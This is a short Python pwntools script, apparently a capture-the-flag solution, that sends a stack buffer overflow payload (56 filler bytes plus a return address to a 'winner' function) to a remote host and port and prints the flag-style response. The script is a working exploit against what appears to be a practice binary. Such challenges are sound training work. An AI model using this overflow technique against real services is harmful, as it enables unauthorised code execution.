#!/usr/bin/env python3


from pwn import *
import sys

def exploit(io):
    winner_addr = 0x401206
    payload = b"A"*56 + p64(winner_addr)
    io.sendline(payload)
    io.recvuntil(b"Congratulations!\n")
    print(io.recv().decode())

def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
